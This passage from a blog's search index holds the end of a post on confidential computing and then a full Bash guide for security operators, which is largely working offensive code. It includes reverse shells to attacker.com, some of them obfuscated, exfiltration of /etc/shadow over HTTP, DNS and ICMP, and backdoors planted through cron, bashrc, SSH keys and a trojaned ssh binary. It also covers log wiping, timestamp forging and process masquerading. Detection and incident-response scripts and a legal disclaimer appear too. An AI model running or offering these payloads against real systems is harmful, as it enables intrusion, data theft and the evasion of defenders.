(healthcare, finance) Getting Started Strategy Phase 1: Proof of Concept (1-2 weeks) Goal: Validate approach with small-scale experiment.\nActions:\nChoose a toy use case (simple analytics, basic ML) Implement with homomorphic encryption (SEAL/TenSEAL) Measure performance overhead Document learnings Success criteria:\nCan you encrypt, compute, decrypt? Is performance acceptable for your use case? Do you understand the limitations? Phase 2: Real Use Case (4-6 weeks) Goal: Apply to actual business problem.\nActions:\nIdentify real use case where value exceeds cost Choose appropriate technology (homomorphic, enclave, or MPC) Implement end-to-end solution Integrate with existing systems Success criteria:\nDoes it solve the problem? Is it production-ready (or close)? Is regulatory/compliance benefit clear? Phase 3: Production (8-12 weeks) Goal: Deploy to production environment.\nActions:\nSecurity audit (critical for confidentiality systems) Performance optimization Monitoring and alerting Documentation and training Success criteria:\nRunning reliably in production Teams understand how to use it Measurable security benefit The Honest Truth Confidential computing isn\u0026rsquo;t for everything. It adds cost, latency, and operational hassle. You need a reason.\nThe reason is usually one of these:\nYou\u0026rsquo;re crossing a trust boundary you can\u0026rsquo;t avoid (third-party analytics, shared platforms, multi-tenant stuff) The data is too sensitive to ever sit in plaintext in someone else\u0026rsquo;s process You\u0026rsquo;re trying to collaborate with someone who will never hand you their raw data (and you won\u0026rsquo;t hand them yours) If none of that applies, don\u0026rsquo;t do it. Use normal encryption and normal access controls and spend the time you saved on monitoring and incident response.\nBased on production deployments at financial institutions, healthcare organizations, and technology companies. Tools mentioned (Microsoft SEAL, OpenMined PySyft, TenSEAL, Intel SGX, AWS Nitro Enclaves) are all production-ready and actively maintained. The revolution isn\u0026rsquo;t preventing access to data. It\u0026rsquo;s processing data you never access.\n","date":"1 Mar 2025","permalink":"https://gazsecops.github.io/posts/confidential-computing-encrypted-data-processing/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-ciso\"\u003eCISO:\u003c/span\u003e Our data never leaves the network. Encrypted at rest, encrypted in transit. We\u0026rsquo;re covered.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e What happens when we need to process it?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-ciso\"\u003eCISO:\u003c/span\u003e We decrypt it, process it, encrypt it again. Standard procedure.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-engineer\"\u003eEngineer:\u003c/span\u003e What if we could process it without ever decrypting it?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-ciso\"\u003eCISO:\u003c/span\u003e Impossible. You can\u0026rsquo;t do math on encrypted data.\u003c/p\u003e\n\u003c/div\u003e\n\u003caside class=\"pullquote\"\u003e\n\"The revolution isn't preventing access to data. It's processing data you never access.\"\n\u003c/aside\u003e\n\u003cp\u003eTraditional encryption works by keeping data secret until you need it. Decrypt, process, encrypt again. It\u0026rsquo;s worked for decades. But it has a fundamental limitation: at some point, the data must be exposed in plaintext.\u003c/p\u003e\n\u003cp\u003eConfidential computing flips this on its head. Instead of protecting data by controlling who can access it, we protect data by ensuring it\u0026rsquo;s never accessible in plaintext at all. Even during processing.\u003c/p\u003e\n\u003cp\u003eThis isn\u0026rsquo;t theoretical. Companies are using it today. Financial analytics on encrypted transactions. Healthcare processing without seeing patient records. Collaborative fraud detection between competitors without sharing raw data.\u003c/p\u003e","tags":["security","confidential-computing","encryption","privacy","homomorphic-encryption"],"title":"Confidential Computing: Processing Data While Keeping It Secret"},{"content":"Bash is on every Unix-like system you\u0026rsquo;ll touch. No installation required. No suspicious binaries to explain. Just a shell that\u0026rsquo;s already there, waiting to be used.\nFor security operators - red team, blue team, doesn\u0026rsquo;t matter - this makes Bash incredibly valuable. You can do reconnaissance, establish persistence, monitor systems, or respond to incidents without touching disk or installing tools. Living off the land, as they say.\n\"The best tools are the ones already on the target. Bash is always there. No explanations needed when someone spots it running.\" This is a practical guide to using Bash for security operations. Not theory. Not vendor pitches. Techniques that work when you\u0026rsquo;re on a system and need to get things done.\nWhy Bash for Security Work It\u0026rsquo;s already there. Every Linux box. Most Unix systems. macOS. Even Windows has WSL now. You don\u0026rsquo;t install Bash. It\u0026rsquo;s just there.\nNo forensic footprint (if you\u0026rsquo;re careful). Execute from memory. Use /dev/shm. Process substitution. Nothing touches disk. Nothing for forensics to find.\nFull system access. File system, network, processes, kernel interfaces. If the system can do it, Bash can access it.\nScripting power. Not just a command interpreter. Full programming language. Variables, functions, loops, conditionals, arrays. Everything you need.\nPipeline magic. Chain commands. Stream processing. Data transformation without intermediate files. Process output in real time.\nThe downside? It\u0026rsquo;s also verbose. Error-prone if you\u0026rsquo;re not careful. Not as fast as compiled tools. But when you need to work with what\u0026rsquo;s already on the system, Bash is hard to beat.\nReconnaissance Without Tools Network Discovery No nmap? No problem.\n# Ping sweep - find live hosts for i in {1..254}; do (ping -c 1 -W 1 192.168.1.$i | grep \u0026#34;bytes from\u0026#34; \u0026amp;) done | cut -d\u0026#39; \u0026#39; -f4 | tr -d \u0026#39;:\u0026#39; The parentheses run each ping in a subshell. Backgrounded. All 254 pings happen simultaneously. Takes about a second instead of 254 seconds.\n# Port scan using /dev/tcp for port in {1..1024}; do timeout 1 bash -c \u0026#34;echo \u0026gt;/dev/tcp/192.168.1.10/$port\u0026#34; 2\u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34;Port $port open\u0026#34; done /dev/tcp is a Bash pseudo-device. Not a real file. Bash intercepts it and opens a TCP connection. Works for scanning. Works for reverse shells. Very useful.\nService Fingerprinting # Banner grabbing exec 3\u0026lt;\u0026gt;/dev/tcp/192.168.1.10/22 cat \u0026lt;\u0026amp;3 \u0026amp; sleep 1 kill %1 exec 3\u0026gt;\u0026amp;- Opens a connection. Reads whatever the service sends. Most services announce themselves. SSH sends version. HTTP sends Server header. FTP sends banner.\nDNS Reconnaissance # Subdomain enumeration for sub in www mail ftp admin api dev staging; do host $sub.example.com 2\u0026gt;/dev/null | grep \u0026#34;has address\u0026#34; \u0026amp;\u0026amp; echo \u0026#34;Found: $sub.example.com\u0026#34; done # Reverse DNS lookup range for i in {1..254}; do host 192.168.1.$i 2\u0026gt;/dev/null | grep \u0026#34;domain name pointer\u0026#34; done No dig, no nslookup, no specialized tools. Just host which is on every system.\nExploitation Primitives Reverse Shells The classic:\nbash -i \u0026gt;\u0026amp; /dev/tcp/attacker.com/4444 0\u0026gt;\u0026amp;1 How it works:\nbash -i: Interactive shell \u0026gt;\u0026amp;: Redirect both stdout and stderr /dev/tcp/attacker.com/4444: Connect to attacker 0\u0026gt;\u0026amp;1: Redirect stdin to the same place Variations:\n# Using exec (cleaner, replaces current shell) exec 5\u0026lt;\u0026gt;/dev/tcp/attacker.com/4444 cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done # Using named pipes (more reliable) rm /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/bash -i 2\u0026gt;\u0026amp;1 | nc attacker.com 4444 \u0026gt;/tmp/f The named pipe version is more stable. Input goes through the pipe, gets executed, output goes back through netcat.\nObfuscated for evasion:\n# Base64 encoded echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d | bash # Variable splitting h=\u0026#34;at\u0026#34;;t=\u0026#34;ta\u0026#34;;c=\u0026#34;ck\u0026#34;;e=\u0026#34;er.com\u0026#34;; bash -i \u0026gt;\u0026amp; /dev/tcp/$t$c$e/4444 0\u0026gt;\u0026amp;1 Not foolproof. But makes automated detection harder.\nCommand Injection Testing When you find a field that might execute commands:\n# Test payloads payloads=( \u0026#34;; id\u0026#34; \u0026#34;| id\u0026#34; \u0026#34;\\$(id)\u0026#34; \u0026#34;\\`id\\`\u0026#34; \u0026#34;\u0026amp;\u0026amp; id\u0026#34; \u0026#34;|| id\u0026#34; ) for payload in \u0026#34;${payloads[@]}\u0026#34;; do curl -s \u0026#34;https://target.com/search?q=test${payload}\u0026#34; | grep \u0026#34;uid=\u0026#34; done If you see uid= in the response, you have command injection.\nFile Transfer Without Tools Upload:\n# Exfiltrate via base64 cat /etc/passwd | base64 | curl -X POST -d @- https://attacker.com/upload # Chunk large files split -b 1M sensitive.db chunk_ for chunk in chunk_*; do curl -X POST -F \u0026#34;file=@$chunk\u0026#34; https://attacker.com/upload rm $chunk done Download:\n# Using only Bash exec 3\u0026lt;\u0026gt;/dev/tcp/attacker.com/80 echo -e \u0026#34;GET /payload.sh HTTP/1.1\\r\\nHost: attacker.com\\r\\n\\r\\n\u0026#34; \u0026gt;\u0026amp;3 sed \u0026#39;1,/^$/d\u0026#39; \u0026lt;\u0026amp;3 \u0026gt; payload.sh exec 3\u0026gt;\u0026amp;- chmod +x payload.sh Opens TCP connection. Sends HTTP GET request. Strips headers. Saves body. No curl. No wget.\nPersistence Techniques Cron Jobs # Add backdoor to user\u0026#39;s crontab (crontab -l 2\u0026gt;/dev/null; echo \u0026#34;*/5 * * * * bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/attacker.com/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;) | crontab - Runs every 5 minutes. Establishes reverse shell. If connection drops, cron will retry in 5 minutes.\nShell Profile Modifications # Backdoor in bashrc echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/attacker.com/4444 0\u0026gt;\u0026amp;1 \u0026amp;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc Triggers every time user opens a shell. Backgrounded so user doesn\u0026rsquo;t notice delay.\nSSH Authorized Keys # Add your public key mkdir -p ~/.ssh chmod 700 ~/.ssh echo \u0026#34;ssh-rsa AAAA...\u0026#34; \u0026gt;\u0026gt; ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys Persistent SSH access. Survives reboots. Hard to detect unless someone checks authorized_keys.\nBinary Replacement # Replace legitimate binary with wrapper mv /usr/bin/ssh /usr/bin/.ssh.real cat \u0026gt; /usr/bin/ssh \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; #!/bin/bash # Backdoor triggers, then executes real ssh bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/attacker.com/4444 0\u0026gt;\u0026amp;1\u0026#39; \u0026amp; exec /usr/bin/.ssh.real \u0026#34;$@\u0026#34; EOF chmod +x /usr/bin/ssh User runs ssh. Backdoor triggers. Real ssh executes. User sees normal behavior.\nDefensive Monitoring Failed Login Detection # Watch for brute force attempts grep \u0026#34;Failed password\u0026#34; /var/log/auth.log | awk \u0026#39;{print $11}\u0026#39; | sort | uniq -c | sort -nr | awk \u0026#39;$1 \u0026gt; 5 {print \u0026#34;Brute force from \u0026#34; $2 \u0026#34;: \u0026#34; $1 \u0026#34; attempts\u0026#34;}\u0026#39; Finds IPs with more than 5 failed logins. Simple brute force detection.\nNew SUID Binary Detection # Create baseline find / -perm -4000 -type f 2\u0026gt;/dev/null \u0026gt; /tmp/suid_baseline # Check for changes find / -perm -4000 -type f 2\u0026gt;/dev/null \u0026gt; /tmp/suid_current diff /tmp/suid_baseline /tmp/suid_current SUID binaries run with owner\u0026rsquo;s privileges. Attackers create SUID shells for privilege escalation. Monitor for new ones.\nProcess Monitoring # Watch for suspicious processes while true; do ps aux | grep -v \u0026#34;^root\u0026#34; | grep -E \u0026#34;nc|ncat|socat|/dev/tcp\u0026#34; | grep -v grep \u0026amp;\u0026amp; echo \u0026#34;Suspicious process detected!\u0026#34; sleep 10 done Looks for common shell tools. Not foolproof (attackers can rename binaries) but catches basic shells.\nFile Integrity Monitoring #!/bin/bash # Simple integrity checker CRITICAL_DIRS=\u0026#34;/bin /sbin /usr/bin /etc\u0026#34; # Create baseline create_baseline() { for dir in $CRITICAL_DIRS; do find $dir -type f -exec sha256sum {} \\; \u0026gt; /var/lib/fim/baseline_$(basename $dir).txt done } # Check integrity check_integrity() { for dir in $CRITICAL_DIRS; do baseline=\u0026#34;/var/lib/fim/baseline_$(basename $dir).txt\u0026#34; current=$(mktemp) find $dir -type f -exec sha256sum {} \\; \u0026gt; $current if ! diff $baseline $current \u0026gt; /dev/null; then echo \u0026#34;ALERT: Changes detected in $dir\u0026#34; diff $baseline $current | grep \u0026#34;^\u0026lt;\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | mail -s \u0026#34;File Integrity Alert\u0026#34; admin@example.com fi rm $current done } # Run check check_integrity Hash critical files. Compare against baseline. Alert on changes. Basic but effective.\nIncident Response System Snapshot When you detect an incident, capture state immediately:\n#!/bin/bash # Quick incident snapshot TIMESTAMP=$(date +%Y%m%d_%H%M%S) OUTDIR=\u0026#34;/tmp/incident_$TIMESTAMP\u0026#34; mkdir -p $OUTDIR # System info hostname \u0026gt; $OUTDIR/hostname date \u0026gt; $OUTDIR/timestamp uptime \u0026gt; $OUTDIR/uptime uname -a \u0026gt; $OUTDIR/uname # Users who \u0026gt; $OUTDIR/users_logged_in w \u0026gt; $OUTDIR/users_activity last -20 \u0026gt; $OUTDIR/recent_logins # Processes ps auxf \u0026gt; $OUTDIR/processes_tree ps aux --sort=-%cpu | head -20 \u0026gt; $OUTDIR/top_cpu ps aux --sort=-%mem | head -20 \u0026gt; $OUTDIR/top_memory # Network netstat -tunap \u0026gt; $OUTDIR/network_connections ss -tunap \u0026gt; $OUTDIR/socket_stats iptables -L -n -v \u0026gt; $OUTDIR/firewall_rules # Files find / -type f -mtime -1 2\u0026gt;/dev/null \u0026gt; $OUTDIR/recently_modified lsof \u0026gt; $OUTDIR/open_files # Package everything tar -czf incident_$TIMESTAMP.tar.gz $OUTDIR rm -rf $OUTDIR Captures system state. Everything you need for initial analysis. Takes 30 seconds to run.\nLive Memory Dump # Capture process memory (requires root) PID=$1 MAPS=/proc/$PID/maps MEM=/proc/$PID/mem while read line; do start=$(echo $line | awk \u0026#39;{print $1}\u0026#39; | cut -d\u0026#39;-\u0026#39; -f1) end=$(echo $line | awk \u0026#39;{print $1}\u0026#39; | cut -d\u0026#39;-\u0026#39; -f2) perms=$(echo $line | awk \u0026#39;{print $2}\u0026#39;) # Only dump readable memory regions if [[ $perms =~ r ]]; then echo \u0026#34;Dumping $start-$end\u0026#34; dd if=$MEM bs=1 skip=$((0x$start)) count=$((0x$end - 0x$start)) \\ of=memory_${PID}_${start}.dump 2\u0026gt;/dev/null fi done \u0026lt; $MAPS Dumps process memory. Useful for malware analysis. Can extract credentials, network connections, decrypted data.\nLog Analysis # Find commands run by specific user grep \u0026#34;sudo:\u0026#34; /var/log/auth.log | grep \u0026#34;USER=root\u0026#34; | grep \u0026#34;COMMAND=\u0026#34; | awk -F\u0026#39;COMMAND=\u0026#39; \u0026#39;{print $2}\u0026#39; | sort | uniq -c | sort -nr # Find successful logins from unexpected IPs grep \u0026#34;Accepted\u0026#34; /var/log/auth.log | awk \u0026#39;{print $11}\u0026#39; | grep -v \u0026#34;192.168.1.\u0026#34; | sort | uniq # Find login attempts outside business hours grep \u0026#34;session opened\u0026#34; /var/log/auth.log | awk \u0026#39;{print $1\u0026#34; \u0026#34;$2\u0026#34; \u0026#34;$3}\u0026#39; | while read date; do hour=$(date -d \u0026#34;$date\u0026#34; +%H) if [[ $hour -lt 7 || $hour -gt 18 ]]; then echo \u0026#34;After-hours login: $date\u0026#34; fi done Log analysis without specialized tools. Grep, awk, sed. Works everywhere.\nCovert Channels DNS Exfiltration # Split data into DNS-safe chunks data=$(cat /etc/shadow | base64 | tr -d \u0026#39;\\n\u0026#39;) for chunk in $(echo $data | fold -w 63); do host ${chunk}.exfil.attacker.com \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 sleep 1 done DNS queries don\u0026rsquo;t look suspicious. Most firewalls allow them. Each query exfiltrates 63 bytes.\nAttacker runs DNS server. Logs all queries. Reconstructs data from query names.\nICMP Tunneling # Encode data in ICMP packet payload message=\u0026#34;secret data\u0026#34; hex=$(echo -n \u0026#34;$message\u0026#34; | xxd -p | tr -d \u0026#39;\\n\u0026#39;) ping -c 1 -p $hex attacker.com \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 ICMP typically allowed through firewalls (for troubleshooting). Can encode data in ping payload.\nHTTP Steganography # Hide commands in legitimate-looking HTTP traffic while true; do # Fetch page, extract hidden command cmd=$(curl -s https://legitimate-site.com/index.html | grep -o \u0026#39;\u0026lt;!-- [a-zA-Z0-9+/=]\\+ --\u0026gt;\u0026#39; | sed \u0026#39;s/\u0026lt;!-- \\(.*\\) --\u0026gt;/\\1/\u0026#39; | base64 -d) if [ -n \u0026#34;$cmd\u0026#34; ]; then # Execute command, exfiltrate result result=$(eval \u0026#34;$cmd\u0026#34; 2\u0026gt;\u0026amp;1 | base64) curl -s -X POST \\ -H \u0026#34;User-Agent: Mozilla/5.0\u0026#34; \\ -H \u0026#34;X-Analytics: $result\u0026#34; \\ https://legitimate-site.com/analytics \u0026gt;/dev/null fi sleep 300 done Command hidden in HTML comment. Result exfiltrated in HTTP header. Looks like normal web traffic.\nMemory-Only Execution Leave no traces on disk:\n# Execute remote script without writing to disk bash \u0026lt;(curl -s https://attacker.com/payload.sh) # Load malware into memory-only filesystem mount -t tmpfs -o size=10M tmpfs /tmp/ramdisk cd /tmp/ramdisk curl -s https://attacker.com/malware -o malware chmod +x malware ./malware Everything in /tmp/ramdisk disappears on reboot. No disk forensics. No file recovery.\n# Execute base64-encoded payload from environment variable export PAYLOAD=\u0026#39;IyEvYmluL2Jhc2gKZWNobyAiUGF5bG9hZCBleGVjdXRlZCI=\u0026#39; bash \u0026lt;(echo $PAYLOAD | base64 -d) Payload never touches disk. Lives in environment variable. Executed directly.\nAnti-Forensics Clear Tracks # Clear history unset HISTFILE export HISTFILESIZE=0 history -c # Clear logs (if you have write access) for log in /var/log/{auth.log,syslog,messages}; do [ -w \u0026#34;$log\u0026#34; ] \u0026amp;\u0026amp; cat /dev/null \u0026gt; $log done # Remove specific entries from history history | grep \u0026#34;sensitive command\u0026#34; | awk \u0026#39;{print $1}\u0026#39; | xargs -I {} history -d {} # Disable history for current session set +o history Won\u0026rsquo;t stop forensics entirely. But removes obvious traces.\nTimestamp Manipulation # Copy timestamps from legitimate file touch -r /bin/ls /tmp/backdoor # Set specific timestamp touch -t 202301010000.00 /tmp/backdoor # Batch timestamp modification find /tmp/malicious_dir -type f -exec touch -r /bin/ls {} \\; Makes malicious files look as old as system binaries. Defeats timeline analysis.\nProcess Hiding # Rename process to look legitimate exec -a \u0026#34;[kworker/0:0]\u0026#34; bash -c \u0026#39;while true; do sleep 60; done\u0026#39; # Or mimic system process exec -a \u0026#34;/usr/lib/systemd/systemd-timesyncd\u0026#34; bash reverse_shell.sh Process shows up as kernel worker or system daemon in ps. Not foolproof (deeper inspection reveals it) but defeats casual observation.\nEvasion Techniques String Obfuscation # Avoid plaintext \u0026#34;wget\u0026#34; in scripts w=\u0026#39;w\u0026#39;; g=\u0026#39;get\u0026#39; $w$g http://attacker.com/payload # Hex encoding cmd=$(echo -n \u0026#39;cat /etc/shadow\u0026#39; | xxd -p) eval $(echo $cmd | xxd -r -p) # Variable indirection c=\u0026#39;c\u0026#39;; a=\u0026#39;a\u0026#39;; t=\u0026#39;t\u0026#39; $c$a$t /etc/passwd Makes static analysis harder. Defeats basic string searches.\nEncoding Techniques # Base64 everything payload=\u0026#39;Y2F0IC9ldGMvcGFzc3dk\u0026#39; eval $(echo $payload | base64 -d) # ROT13 for obfuscation (not security) payload=$(echo \u0026#39;cat /etc/passwd\u0026#39; | tr \u0026#39;A-Za-z\u0026#39; \u0026#39;N-ZA-Mn-za-m\u0026#39;) eval $(echo $payload | tr \u0026#39;A-Za-z\u0026#39; \u0026#39;N-ZA-Mn-za-m\u0026#39;) # Compression payload=$(echo \u0026#39;cat /etc/shadow\u0026#39; | gzip | base64) eval $(echo $payload | base64 -d | gunzip) Multiple layers of encoding. Harder to detect. Harder to analyze.\nPractical Security Scripts Privilege Escalation Check #!/bin/bash # Quick privesc enumeration echo \u0026#34;[+] SUID binaries:\u0026#34; find / -perm -4000 -type f 2\u0026gt;/dev/null echo \u0026#34;[+] Writable directories in PATH:\u0026#34; echo $PATH | tr \u0026#39;:\u0026#39; \u0026#39;\\n\u0026#39; | while read dir; do [ -w \u0026#34;$dir\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;$dir\u0026#34; done echo \u0026#34;[+] World-writable files:\u0026#34; find / -perm -2 -type f -not -path \u0026#34;/proc/*\u0026#34; 2\u0026gt;/dev/null | head -20 echo \u0026#34;[+] Capabilities:\u0026#34; getcap -r / 2\u0026gt;/dev/null echo \u0026#34;[+] Sudo permissions:\u0026#34; sudo -l 2\u0026gt;/dev/null echo \u0026#34;[+] Cron jobs:\u0026#34; for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; done echo \u0026#34;[+] Readable /etc/shadow:\u0026#34; test -r /etc/shadow \u0026amp;\u0026amp; echo \u0026#34;/etc/shadow is readable!\u0026#34; Checks common privilege escalation vectors. Run after initial access.\nPort Knock Client #!/bin/bash # Port knocking to open backdoor HOST=$1 SEQUENCE=\u0026#34;7000 8000 9000\u0026#34; for port in $SEQUENCE; do echo \u0026gt;/dev/tcp/$HOST/$port 2\u0026gt;/dev/null sleep 1 done # After knock sequence, backdoor port should be open bash -i \u0026gt;\u0026amp; /dev/tcp/$HOST/4444 0\u0026gt;\u0026amp;1 Port knocking hides backdoor. Firewall blocks 4444 until correct sequence sent.\nData Exfiltration Wrapper #!/bin/bash # Exfiltrate files gradually to avoid detection FILE=$1 DEST=$2 # Split into small chunks split -b 64K $FILE chunk_ # Send chunks slowly for chunk in chunk_*; do # Encode and send data=$(base64 \u0026lt; $chunk) curl -s -X POST -d \u0026#34;data=$data\u0026#34; $DEST # Clean up rm $chunk # Wait to avoid traffic spikes sleep $(shuf -i 60-300 -n 1) done Exfiltrates slowly. Random delays. Harder to detect than bulk transfer.\nDefensive Best Practices Input Validation #!/bin/bash # Safe input handling validate_input() { local input=\u0026#34;$1\u0026#34; # Only allow alphanumeric, underscore, hyphen if [[ ! $input =~ ^[a-zA-Z0-9_-]+$ ]]; then echo \u0026#34;Invalid input\u0026#34; \u0026gt;\u0026amp;2 return 1 fi echo \u0026#34;$input\u0026#34; } # Usage user_input=$(validate_input \u0026#34;$1\u0026#34;) || exit 1 grep \u0026#34;$user_input\u0026#34; /var/log/auth.log Never trust user input. Validate before use. Prevents injection.\nSecure PATH #!/bin/bash # Lock down PATH # Set known-good PATH PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34; readonly PATH # Use absolute paths for critical commands /bin/grep \u0026#34;root\u0026#34; /etc/passwd | /usr/bin/awk -F: \u0026#39;{print $1}\u0026#39; Prevents PATH hijacking. Attacker can\u0026rsquo;t replace commands with malicious versions.\nSecure Temporary Files #!/bin/bash # Safe temp file handling # Create secure temp file TEMP=$(mktemp) || exit 1 trap \u0026#39;rm -f \u0026#34;$TEMP\u0026#34;\u0026#39; EXIT # Use temp file echo \u0026#34;sensitive data\u0026#34; \u0026gt; \u0026#34;$TEMP\u0026#34; process_data \u0026#34;$TEMP\u0026#34; # Automatically cleaned up on exit mktemp creates file with random name. trap ensures cleanup even if script crashes.\nDetection Techniques Spotting Bash Abuse Monitor for suspicious Bash activity:\n# Watch for unusual Bash usage ps aux | grep bash | grep -E \u0026#39;/dev/tcp|/dev/udp|base64|curl.*bash\u0026#39; # Check for backgrounded shells ps aux | grep bash | grep -v \u0026#34;^$USER\u0026#34; | grep \u0026#34;\u0026amp;\u0026#34; # Monitor Bash history for suspicious commands for home in /home/*; do [ -f \u0026#34;$home/.bash_history\u0026#34; ] \u0026amp;\u0026amp; grep -E \u0026#39;wget|curl|base64|nc|socat|/dev/tcp\u0026#39; \u0026#34;$home/.bash_history\u0026#34; done Audit Logging # Enable process accounting apt-get install acct systemctl enable acct systemctl start acct # Check executed commands lastcomm | grep bash sa -u | grep bash # Enable auditd for command logging auditctl -a always,exit -F arch=b64 -S execve -k exec_commands ausearch -k exec_commands Process accounting logs every command. Auditd provides detailed execution logs.\nReal-World Scenarios Scenario: Locked Out, Need Access You\u0026rsquo;re on a system. Accidentally broke SSH config. Can\u0026rsquo;t reconnect if disconnected. Need another way in.\nSysadmin: Crap. SSH config is broken. If I disconnect, I\u0026rsquo;m locked out.\nEngineer: Can you set up a backup access method?\nSysadmin: Yeah, cron job to start nc listener.\n# Add cron job that starts listener every 5 minutes (crontab -l; echo \u0026#34;*/5 * * * * nc -lvp 9999 -e /bin/bash\u0026#34;) | crontab - # From your machine nc target.com 9999 # Shell access restored Not elegant. But works in a pinch.\nScenario: Incident Response, Need Quick Triage Called at 2am. System might be compromised. Need to check without specialized tools.\n# Quick compromise indicators echo \u0026#34;[+] Recent connections:\u0026#34; netstat -tunap | grep ESTABLISHED echo \u0026#34;[+] Listening ports:\u0026#34; netstat -tunap | grep LISTEN echo \u0026#34;[+] Recent logins:\u0026#34; last -10 echo \u0026#34;[+] Running processes (non-root):\u0026#34; ps aux | grep -v \u0026#34;^root\u0026#34; | head -20 echo \u0026#34;[+] Recent file modifications:\u0026#34; find /tmp /var/tmp /dev/shm -type f -mmin -60 2\u0026gt;/dev/null echo \u0026#34;[+] Suspicious cron jobs:\u0026#34; for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; | grep -E \u0026#39;wget|curl|nc|bash\u0026#39; done Five minutes of checking. Catches obvious compromises.\nScenario: Need to Bypass Detection Red team engagement. Blue team has IDS watching for common tools. Need stealthy reconnaissance.\n# Use Bash instead of nmap target=\u0026#34;192.168.1.10\u0026#34; # Port scan with random delays for port in 22 80 443 3389; do timeout 1 bash -c \u0026#34;echo \u0026gt;/dev/tcp/$target/$port\u0026#34; 2\u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34;Port $port open\u0026#34; sleep $(shuf -i 5-15 -n 1) done # Grab banners slowly for port in $(cat open_ports.txt); do exec 3\u0026lt;\u0026gt;/dev/tcp/$target/$port timeout 2 cat \u0026lt;\u0026amp;3 exec 3\u0026gt;\u0026amp;- sleep $(shuf -i 10-30 -n 1) done Slow and steady. Random delays. No nmap signature. Harder to detect.\nLimitations and Risks Bash isn\u0026rsquo;t perfect for security work:\nPerformance: Slower than compiled tools. For large-scale operations, write proper code.\nError-prone: Easy to make mistakes. Missing quotes, word splitting, globbing. Test thoroughly.\nNot stealthy by default: Every command creates entries. History, logs, process accounting. You have to actively cover tracks.\nLimited functionality: Can\u0026rsquo;t do everything. Complex protocols, binary manipulation, some network operations need real tools.\nForensic evidence: Even memory-only execution leaves traces. Process memory, network connections, command lines in /proc.\nDetection: Defenders know these techniques too. SOC teams watch for /dev/tcp, unusual base64, suspicious process names.\nUse Bash when it makes sense. Don\u0026rsquo;t force it when proper tools would work better.\nEthical and Legal Considerations Everything in this guide is for authorized testing only.\nDon\u0026rsquo;t:\nUse these techniques on systems you don\u0026rsquo;t own or have written permission to test Deploy backdoors on production systems without change control Exfiltrate data you\u0026rsquo;re not authorized to access Test techniques on systems where you only have user-level access Do:\nGet written authorization before testing Document what you do during engagements Clean up after yourself (remove backdoors, clear artifacts) Report findings responsibly Follow rules of engagement Unauthorized access is illegal. Computer Fraud and Abuse Act in the US. Computer Misuse Act in the UK. Similar laws everywhere.\nIf you\u0026rsquo;re doing red team work, get a signed contract. Scope of work. Rules of engagement. Legal protection.\nIf you\u0026rsquo;re doing blue team work, make sure your monitoring is legally sound. Privacy laws matter.\nIf you\u0026rsquo;re learning, use your own systems. Virtual machines. Home labs. Not production. Not systems you don\u0026rsquo;t own.\nTooling Recommendations Bash is great for living off the land. But sometimes you need real tools:\nNetwork scanning: nmap (better performance, more features) Exploitation: Metasploit (mature framework, lots of exploits) Post-exploitation: Empire, Covenant (proper C2 frameworks) Persistence: Implants written in compiled languages (harder to detect) Defense: OSSEC, Wazuh (proper HIDS/SIEM) Monitoring: Auditd, syslog-ng, Elastic Stack (proper logging)\nUse Bash when:\nYou\u0026rsquo;re on a system without other tools You need to avoid detection Quick one-off tasks Gluing tools together Initial access and reconnaissance Use proper tools when:\nLarge-scale operations Long-term access needed Complex protocols Performance matters Professional engagements Summary Bash is everywhere. That makes it valuable for security work. Red team can use it for reconnaissance, exploitation, persistence without installing tools. Blue team can use it for monitoring, incident response, threat hunting.\nKey points:\nReconnaissance: Network scanning, service enumeration, information gathering without specialized tools Exploitation: Reverse shells, command injection, file transfer using only Bash Persistence: Cron jobs, profile modifications, SSH keys, binary replacement Defense: Monitoring, log analysis, integrity checking, incident response Covert channels: DNS, ICMP, HTTP for stealthy communication Anti-forensics: Memory-only execution, timestamp manipulation, track covering Evasion: Obfuscation, encoding, process hiding Bash won\u0026rsquo;t replace specialized tools. But when you need to work with what\u0026rsquo;s already there, it\u0026rsquo;s incredibly powerful.\nKnow the techniques. Understand the limitations. Use ethically and legally.\nMost importantly: test on systems you own. Get authorization for everything else.\nThis guide covers techniques used in penetration testing and red team operations. All techniques should only be used on systems you own or have explicit written permission to test. Unauthorized access is illegal.\n","date":"3 Dec 2024","permalink":"https://gazsecops.github.io/posts/bash-security-operators-guide/","summary":"\u003cp\u003eBash is on every Unix-like system you\u0026rsquo;ll touch. No installation required. No suspicious binaries to explain. Just a shell that\u0026rsquo;s already there, waiting to be used.\u003c/p\u003e\n\u003cp\u003eFor security operators - red team, blue team, doesn\u0026rsquo;t matter - this makes Bash incredibly valuable. You can do reconnaissance, establish persistence, monitor systems, or respond to incidents without touching disk or installing tools. Living off the land, as they say.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"The best tools are the ones 